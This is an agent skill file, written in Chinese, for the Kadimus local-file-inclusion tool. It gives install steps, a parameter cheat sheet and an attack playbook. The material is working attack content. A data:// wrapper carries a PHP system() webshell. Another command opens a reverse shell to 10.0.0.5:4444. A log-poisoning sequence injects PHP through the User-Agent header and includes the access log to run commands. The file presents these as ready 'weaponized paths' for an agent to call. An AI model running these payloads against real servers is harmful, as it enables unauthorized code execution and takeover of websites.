---
name: kadimus-lfi-rce
description: 渗透工具 skill:Kadimus 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(LFI) 需要调用 Kadimus 时使用。
when-to-use: 渗透工具 skill:Kadimus 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(LFI) 需要调用 Kadimus 时使用。
---

# Kadimus

- 攻击大类:C09 Web利用(LFI)
- 上游仓库:https://github.com/P0cL4bs/Kadimus
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/P0cL4bs/Kadimus && cd Kadimus && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./kadimus -u 'https://t.com/?page=about'` | LFI 检测 |
| `-t -u url -D data:// -c '<?php system($_GET[0]);?>'` | data:// 封装+命令执行 |
| `--lfi-log /var/log/apache2/access.log` | 日志污染路径 |
| `-S 10.0.0.5:4444 -u url -D /proc/self/fd/` | 自包含反弹 shell |
| `--cookie 'PHPSESSID=xxx'` | 带 Cookie 扫描 |
| `-b` | base64 输出处理 |

## 攻击场景 Playbook

### 日志污染拿 shell

```bash
curl -A "<?php system(\$_GET['c']);?>" http://t.com/
./kadimus -u 'http://t.com/view.php?file=../../../../var/log/apache2/access.log&c=id' --cmd id
```

## 注意事项

LFI 专项: data://、/proc/self/environ、日志污染、php://input 四条武器化路径。
